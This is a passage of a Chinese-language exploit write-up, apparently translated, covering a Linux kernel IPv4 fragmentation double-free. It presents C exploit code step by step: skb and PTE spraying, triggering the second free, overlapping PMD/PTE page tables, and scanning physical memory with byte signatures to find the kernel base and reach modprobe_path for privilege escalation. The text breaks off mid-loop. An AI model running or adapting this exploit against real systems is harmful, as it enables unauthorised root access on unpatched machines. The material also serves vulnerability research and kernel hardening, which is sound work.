<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> intermed_buf[<span class="number">1</span> &lt;&lt; <span class="number">19</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">send_ipv4_ip_hdr_chr</span><span class="params">(<span class="type">size_t</span> dfsize, <span class="keyword">struct</span> ip *ip_header, <span class="type">char</span> chr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">memset</span>(intermed_buf, chr, dfsize);</span><br><span class="line">    send_ipv4_ip_hdr(intermed_buf, dfsize, ip_header);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">trigger_double_free_hdr</span><span class="params">(<span class="type">size_t</span> dfsize, <span class="keyword">struct</span> ip *ip_header)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] sending double free buffer packet...\n&quot;</span>);</span><br><span class="line">    send_ipv4_ip_hdr_chr(dfsize, ip_header, <span class="string">&#x27;\x41&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">privesc_flh_bypass_no_time</span><span class="params">(<span class="type">int</span> shell_stdin_fd, <span class="type">int</span> shell_stdout_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...（skb 喷射）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从空闲列表中分配并释放 1 个 skb</span></span><br><span class="line">    df_ip_header.ip_id = <span class="number">0x1337</span>;</span><br><span class="line">    df_ip_header.ip_len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ip) * <span class="number">2</span> + <span class="number">32768</span> + <span class="number">24</span>;</span><br><span class="line">    df_ip_header.ip_off = ntohs((<span class="number">0</span> &gt;&gt; <span class="number">3</span>) | <span class="number">0x2000</span>);  <span class="comment">// 等待其他碎片，8 &gt;&gt; 3 让它等待？</span></span><br><span class="line">    trigger_double_free_hdr(<span class="number">32768</span> + <span class="number">8</span>, &amp;df_ip_header);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...（漏洞的其余部分）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="5-1-2-3-使用-skb-掩盖双重释放"><a href="#5-1-2-3-使用-skb-掩盖双重释放" class="headerlink" title="5.1.2.3 使用 skb 掩盖双重释放"></a>5.1.2.3 使用 skb 掩盖双重释放</h4><p>为了防止检测到双重释放并提高漏洞的稳定性，我们喷射释放之前分配的 UDP 数据包。</p>
<p><strong>代码块 5.1.2.3.1</strong>：漏洞利用的 <code>recv_ipv4_udp()</code> 函数，使用 C 编写，用于抽象 UDP 数据包的接收。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> intermed_buf[<span class="number">1</span> &lt;&lt; <span class="number">19</span>]; <span class="comment">// 简单地预分配中间缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> sendto_ipv4_udp_server_sockfd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">recv_ipv4_udp</span><span class="params">(<span class="type">int</span> content_len)</span></span><br><span class="line">&#123;</span><br><span class="line">    PRINTF_VERBOSE(<span class="string">&quot;[*] doing udp recv...\n&quot;</span>);</span><br><span class="line">    recv(sendto_ipv4_udp_server_sockfd, intermed_buf, content_len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    PRINTF_VERBOSE(<span class="string">&quot;[*] udp packet preview: %02hhx\n&quot;</span>, intermed_buf[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>代码块 5.1.2.3.2</strong>：部分漏洞利用代码，使用 C 编写，释放先前分配的 <code>sk_buff</code> 对象。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">privesc_flh_bypass_no_time</span><span class="params">(<span class="type">int</span> shell_stdin_fd, <span class="type">int</span> shell_stdout_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...（触发双重释放）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 N 个 skb 推回到 skb 空闲列表中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CONFIG_SKB_SPRAY_AMOUNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PRINTF_VERBOSE(<span class="string">&quot;[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n&quot;</span>, i, CONFIG_SKB_SPRAY_AMOUNT);</span><br><span class="line">        recv_ipv4_udp(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...（漏洞的其余部分）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="5-1-2-4-喷射-PTE"><a href="#5-1-2-4-喷射-PTE" class="headerlink" title="5.1.2.4 喷射 PTE"></a>5.1.2.4 喷射 PTE</h4><p>为了喷射 PTE（页表项），我们只需访问先前在虚拟内存区域（VMA）中注册的虚拟内存页。请注意，一个 PTE 包含 512 个页，因此总共为 <code>0x20&#39;0000</code> 字节。因此，我们每次访问 <code>0x20&#39;0000</code> 字节，总共访问 <code>CONFIG_PTE_SPRAY_AMOUNT</code> 次。</p>
<p>为了简化这个过程，我编写了一个宏，用于将页表索引转换为虚拟内存地址。例如，<code>mm-&gt;pgd[pud_nr][pmd_nr][pte_nr][page_nr]</code> 负责虚拟内存页 <code>PTI_TO_VIRT(pud_nr, pmd_nr, pte_nr, page_nr, 0)</code>。例如，<code>mm-&gt;pgd[1][0][0][0]</code> 指向虚拟内存页 <code>0x80&#39;0000&#39;0000</code>。</p>
<p><strong>代码块 5.1.2.4.1</strong>：部分漏洞利用代码，使用 C 编写，用于喷射 PTE 页面并定义一个宏将页表索引转换为虚拟地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _pte_index_to_virt(i) (i &lt;&lt; 12)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _pmd_index_to_virt(i) (i &lt;&lt; 21)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _pud_index_to_virt(i) (i &lt;&lt; 30)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _pgd_index_to_virt(i) (i &lt;&lt; 39)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \</span></span><br><span class="line"><span class="meta">    ((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \</span></span><br><span class="line"><span class="meta">    _pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">privesc_flh_bypass_no_time</span><span class="params">(<span class="type">int</span> shell_stdin_fd, <span class="type">int</span> shell_stdout_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...（喷射释放 skb）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从 PCP 分配器的 order-0 列表中喷射分配 PTE</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] spraying %d pte&#x27;s...\n&quot;</span>, CONFIG_PTE_SPRAY_AMOUNT);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i = <span class="number">0</span>; i &lt; CONFIG_PTE_SPRAY_AMOUNT; i++)</span><br><span class="line">        *(<span class="type">char</span>*)PTI_TO_VIRT(<span class="number">2</span>, <span class="number">0</span>, i, <span class="number">0</span>, <span class="number">0</span>) = <span class="number">0x41</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...（漏洞的其余部分）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="5-1-2-5-触发双重释放的第二次释放"><a href="#5-1-2-5-触发双重释放的第二次释放" class="headerlink" title="5.1.2.5 触发双重释放的第二次释放"></a>5.1.2.5 触发双重释放的第二次释放</h4><p>之前我们已经耗尽了 PCP 列表，并在我们使用第一次释放所释放的页面条目上分配了一些 PTE。现在，我们将执行第二次释放，以利用其页面空闲列表条目分配一个重叠的 PMD。</p>
<p>我们需要使用非常特定的 IP 头选项组合来绕过 IPv4 碎片队列代码中的某些检查。具体细节请查看相关的背景信息和&#x2F;或技术部分。</p>
<p><strong>代码块 5.1.2.5.1</strong>：部分漏洞利用代码，使用 C 编写，用于触发第二次释放并导航特定的 IP 碎片队列。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">privesc_flh_bypass_no_time</span><span class="params">(<span class="type">int</span> shell_stdin_fd, <span class="type">int</span> shell_stdout_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...（喷射分配 PTE）</span></span><br><span class="line"></span><br><span class="line">    PRINTF_VERBOSE(<span class="string">&quot;[*] double-freeing skb...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对之前的 skb 触发双重释放</span></span><br><span class="line">    df_ip_header.ip_id = <span class="number">0x1337</span>;</span><br><span class="line">    df_ip_header.ip_len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ip) * <span class="number">2</span> + <span class="number">32768</span> + <span class="number">24</span>;</span><br><span class="line">    df_ip_header.ip_off = ntohs(((<span class="number">32768</span> + <span class="number">8</span>) &gt;&gt; <span class="number">3</span>) | <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// skb1-&gt;len 在 set_freepointer() 中被 s-&gt;random() 覆盖。需要使用一些技巧绕过 skb1-&gt;len，丢弃队列</span></span><br><span class="line">    <span class="comment">// 在 ip_frag_queue() 中导致 end == offset，数据包将为空</span></span><br><span class="line">    <span class="comment">// 持续运行直到两次释放完成，即不需要 sleep</span></span><br><span class="line">    alloc_intermed_buf_hdr(<span class="number">0</span>, &amp;df_ip_header);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...（漏洞的其余部分）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="5-1-2-6-分配-PMD"><a href="#5-1-2-6-分配-PMD" class="headerlink" title="5.1.2.6 分配 PMD"></a>5.1.2.6 分配 PMD</h4><p>现在我们有了对双重释放页的第二个空闲列表条目（注意它已经被 PTE 分配了，所以同时不存在两个空闲列表条目），我们可以将重叠的 PMD 分配到这个页。这是非常复杂的操作。</p>
<p><strong>代码块 5.1.2.6.1</strong>：部分漏洞利用代码，使用 C 编写，通过写入用户态页来分配重叠的 PMD 页。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">privesc_flh_bypass_no_time</span><span class="params">(<span class="type">int</span> shell_stdin_fd, <span class="type">int</span> shell_stdout_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...（skb 的第二次释放）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配重叠的 PMD 页（与 PTE 重叠）</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)_pmd_area = <span class="number">0xCAFEBABE</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...（漏洞的其余部分）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="5-1-2-7-查找重叠的-PTE"><a href="#5-1-2-7-查找重叠的-PTE" class="headerlink" title="5.1.2.7 查找重叠的 PTE"></a>5.1.2.7 查找重叠的 PTE</h4><p>现在我们有了某处的重叠 PMD 和 PTE，我们需要找出哪一个喷射的 PTE 是重叠的。这个过程也非常简单，只需检查哪个 PTE 区域中的 PTE 条目属于 PMD 区域即可。这实际上等于检查该值是否不是原始值，表明该页被覆盖。</p>
<p>如果我们想执行手动合理性检查，也可以将物理地址 <code>0x0</code> 打印给用户。通常这属于 MMIO 设备，但通常看起来相同。</p>
<p><strong>代码块 5.1.2.7.1</strong>：部分漏洞利用代码，使用 C 编写，通过写入用户态页来分配重叠的 PMD 页。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">privesc_flh_bypass_no_time</span><span class="params">(<span class="type">int</span> shell_stdin_fd, <span class="type">int</span> shell_stdout_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...（分配重叠的 PMD 页）</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] checking %d sprayed pte&#x27;s for overlap...\n&quot;</span>, CONFIG_PTE_SPRAY_AMOUNT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找重叠的 PTE 区域</span></span><br><span class="line">    pte_area = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i = <span class="number">0</span>; i &lt; CONFIG_PTE_SPRAY_AMOUNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *test_target_addr = PTI_TO_VIRT(<span class="number">2</span>, <span class="number">0</span>, i, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// PTE 条目 pte[0] 应该是 &amp;pmd_area 的 PFN+标志</span></span><br><span class="line">        <span class="comment">// 如果这是双重分配的 PTE，则值是 PFN+标志，而不是 0x41</span></span><br><span class="line">        <span class="keyword">if</span> (*test_target_addr != <span class="number">0x41</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] confirmed double alloc PMD/PTE\n&quot;</span>);</span><br><span class="line">            PRINTF_VERBOSE(<span class="string">&quot;    - PTE area index: %lld\n&quot;</span>, i);</span><br><span class="line">            PRINTF_VERBOSE(<span class="string">&quot;    - PTE area (write target address/page): %016llx (new)\n&quot;</span>, *test_target_addr);</span><br><span class="line">            pte_area = test_target_addr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pte_area == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)_pmd_area);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置新的 PTE 值以进行合理性检查</span></span><br><span class="line">    *pte_area = <span class="number">0x0</span> | <span class="number">0x8000000000000867</span>;</span><br><span class="line"></span><br><span class="line">    flush_tlb(_pmd_area, <span class="number">0x400000</span>);</span><br><span class="line">    PRINTF_VERBOSE(<span class="string">&quot;    - PMD area (read target value/page): %016llx (new)\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)_pmd_area);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// （漏洞的其余部分）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="5-1-3-扫描物理内存"><a href="#5-1-3-扫描物理内存" class="headerlink" title="5.1.3 扫描物理内存"></a>5.1.3 扫描物理内存</h3><p>在我们设置了 PUD+PMD 双重分配后，我们可以利用 Dirty Pagedirectory 的真正潜力：一个完全从用户态进行的内核空间镜像攻击（Kernel-Space Mirroring Attack, KSMA）。现在我们可以将物理地址作为 PTE 条目写入到 PTE 区域的某个地址，然后在 PMD 区域将其“解引用”作为一个普通的内存页。</p>
<p>在本节中，我们将获取物理内核基址，然后利用它访问具有读写权限的 <code>modprobe_path</code> 内核变量。</p>
<h4 id="5-1-3-1-查找内核基址"><a href="#5-1-3-1-查找内核基址" class="headerlink" title="5.1.3.1 查找内核基址"></a>5.1.3.1 查找内核基址</h4><p>在这里，我们应用所提到的物理 KASLR 绕过方法来查找物理内核基址。假设设备有 8GiB 的物理内存，这将需要扫描的内存从 8GiB 减少到 2MiB 页面。幸运的是，我们只需要大约每页 40 字节来判断是否是内核基址，这意味着在最坏情况下需要读取 512 * 40 &#x3D; 20,480 字节即可找到内核基址。</p>
<p>为了确定某个页是否是内核基址，我编写了 <code>get-sig</code> Python 脚本，该脚本查找相同地址处的常见字节（签名），过滤掉在物理内存中常见的签名，并将其转换为 <code>memcmp</code> 语句。通过增加内核样本的数量，我们可以扩展对其他内核的支持（例如不同的编译器和旧版本）。输出看起来像如下代码块。</p>
<p><strong>代码块 5.1.3.1.1</strong>：漏洞利用函数 <code>is_kernel_base()</code> 使用 C 编写，通过与内核基址的签名进行比较。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">is_kernel_base</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 感谢 Python</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// get-sig kernel_runtime_1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(addr + <span class="number">0x0</span>, <span class="string">&quot;\x48\x8d\x25\x51\x3f&quot;</span>, <span class="number">5</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(addr + <span class="number">0x7</span>, <span class="string">&quot;\x48\x8d\x3d\xf2\xff\xff\xff&quot;</span>, <span class="number">7</span>) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get-sig kernel_runtime_2</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(addr + <span class="number">0x0</span>, <span class="string">&quot;\xfc\x0f\x01\x15&quot;</span>, <span class="number">4</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(addr + <span class="number">0x8</span>, <span class="string">&quot;\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf&quot;</span>, <span class="number">12</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(addr + <span class="number">0x18</span>, <span class="string">&quot;\x89\xde\x8b\x0d&quot;</span>, <span class="number">4</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(addr + <span class="number">0x20</span>, <span class="string">&quot;\xc1\xe9\x02\xf3\xa5\xbc&quot;</span>, <span class="number">6</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(addr + <span class="number">0x2a</span>, <span class="string">&quot;\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00&quot;</span>, <span class="number">24</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(addr + <span class="number">0x45</span>, <span class="string">&quot;\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00&quot;</span>, <span class="number">15</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(addr + <span class="number">0x55</span>, <span class="string">&quot;\x08\x00\xb9\x01\x01\x00\xc0\xb8&quot;</span>, <span class="number">8</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(addr + <span class="number">0x61</span>, <span class="string">&quot;\x31\xd2\x0f\x30\xe8&quot;</span>, <span class="number">5</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(addr + <span class="number">0x6a</span>, <span class="string">&quot;\x48\xc7\xc6&quot;</span>, <span class="number">3</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(addr + <span class="number">0x71</span>, <span class="string">&quot;\x48\xc7\xc0\x80\x00\x00&quot;</span>, <span class="number">6</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(addr + <span class="number">0x78</span>, <span class="string">&quot;\xff\xe0&quot;</span>, <span class="number">2</span>) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>现在是时候进行扫描了。我们将 PTE 页（与负责 <code>pmd_kernel_area</code> 的 PMD 页重叠）填充为所有可能是内核基址的 512 页。如果需要扫描超过 512 页，我们只需将代码放入循环中，并增加 PFN（物理地址）。</p>
<blockquote>
<p>重申一下：这是 512 页，因为我们处理的是 8GiB 的物理内存。如果是 4GiB，则是 256 页，因为 <code>4GiB / CONFIG_PHYSICAL_START = 256</code>。</p>
</blockquote>
<p>当我们在 PTE 页中设置 PTE 条目（<code>pte_area[j] = (CONFIG_PHYSICAL_START * j) | 0x8000000000000867;</code>）时，我们设置了 PFN（<code>CONFIG_PHYSICAL_START * j</code>，可以看作物理地址）和相应的标志（<code>0x8000000000000867</code>），例如页面的权限（读写等）。</p>
<p>记住，从 Dirty Pagedirectory 部分我们知道，由于双重释放：<code>mm-&gt;pgd[0][1] (PMD) == mm-&gt;pgd[0][2][0] (PTE)</code>，因此 <code>mm-&gt;pgd[0][1][x] (PTE) == mm-&gt;pgd[0][2][0][x] (用户态页)</code>，<code>x = 0-&gt;511</code>。这意味着我们可以在重叠的 PMD 中覆盖 512 个 PTE，并与 512 个用户态页重叠。这些 512 个 PTE 负责另外 512 个用户态页，这意味着我们一次可以设置 <code>512 * 512 * 0x1000 = 0x4000&#39;0000</code>（1GiB）内存。</p>
<p>为了便于阅读，我只使用了这 512 个 PTE 中的两个，并分别将它们用作 <code>pmd_kernel_area</code>（用于扫描内核基址）和 <code>pmd_data_area</code>（用于扫描内核内存内容）。</p>
<p><strong>代码块 5.1.3.1.2</strong>：部分漏洞利用函数 <code>privesc_flh_bypass_no_time()</code> 的代码，使用 C 编写，用于查找物理内核基址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">privesc_flh_bypass_no_time</span><span class="params">(<span class="type">int</span> shell_stdin_fd, <span class="type">int</span> shell_stdout_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...（设置 dirty pagedirectory）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 范围 = (k * j) * CONFIG_PHYSICAL_ALIGN</span></span><br><span class="line">    <span class="comment">// 每次迭代扫描 512 页（1 个 PTE 大小）以</span></span><br><span class="line"></span><br><span class="line">查找内核基址</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * <span class="number">512</span>)); k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> kernel_iteration_base;</span><br><span class="line"></span><br><span class="line">        kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * <span class="number">512</span>);</span><br><span class="line"></span><br><span class="line">        PRINTF_VERBOSE(<span class="string">&quot;[*] setting kernel physical address range to 0x%016llx - 0x%016llx\n&quot;</span>, kernel_iteration_base, kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * <span class="number">512</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">short</span> j = <span class="number">0</span>; j &lt; <span class="number">512</span>; j++)</span><br><span class="line">            pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | <span class="number">0x8000000000000867</span>;</span><br><span class="line"></span><br><span class="line">        flush_tlb(_pmd_area, <span class="number">0x400000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 每次迭代扫描 1 页（而不是 CONFIG_PHYSICAL_ALIGN）以查找内核基址</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> j = <span class="number">0</span>; j &lt; <span class="number">512</span>; j++)</span><br><span class="line">        